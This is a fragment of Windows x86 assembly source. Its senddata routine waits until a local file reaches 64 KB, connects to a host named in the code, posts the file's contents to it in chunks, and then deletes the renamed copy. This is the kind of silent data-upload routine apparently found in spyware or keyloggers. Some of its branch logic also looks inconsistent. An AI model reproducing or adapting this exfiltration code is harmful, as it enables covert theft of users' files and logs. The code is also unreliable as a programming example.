PUBLIC senddata
senddata proc STDCALL

        call    CreateFile, offset fname, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
        mov     _hFile2, eax

        call    GetFileSize, _hFile2, offset _temp

        cmp     eax, 010000h
        jb      @_error

        call    CloseHandle,    _hFile2
        call    WSAStartup,     0101h, offset _wsadata

        jne     @_error

        call    socket, 2, 1, 0

        mov     _socket, eax

        call    gethostbyname, offset _host

        jne     @_error

        mov     eax, [eax+12]
        mov     eax, [eax]
        mov     eax, [eax]
        mov     _sin_addr, eax

        call    connect, _socket, offset _sin_fam, 010h

        jne     @_error

        call    MoveFileA, offset fname, offset newname

        call    CreateFile, offset fname, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
        mov     _hFile2, eax

        call    GetFileSize, _hFile2, offset _temp

        mov     _fsize, eax
        mov     edx, 0
        lea     edi, _postend
        call    int2str

        call    lstrlen, offset _post
        call    send,           _socket, offset _post, eax, 0

        mov     ebx, _fsize

@_rep:

        push    0
        push    offset _temp

        cmp     ebx, 01000h
        jb      @_wfs
        push    01000h
        jmp     @_wfg

@_wfs:

        push    ebx

@_wfg:

        push    offset _buf
        push    _hFile2
        call    ReadFile
        call    send,   _socket, offset _buf, _temp, 0

        sub     ebx, _temp
        cmp     ebx, 0

        jg      @_rep

        call    delay, 5000

@_error:

        call    CloseHandle, _hFile2
        call    DeleteFileA, offset newname
        call    closesocket, _socket
        call    WSACleanup

        ret

senddata endp

PUBLIC delay
delay proc STDCALL, _ms:DWORD

        call    GetTickCount
        mov     _tick, eax

@_loop0:

        call    GetTickCount
        sub     eax, _tick
        cmp     eax, _ms
        jl      @_loop0

        ret

delay endp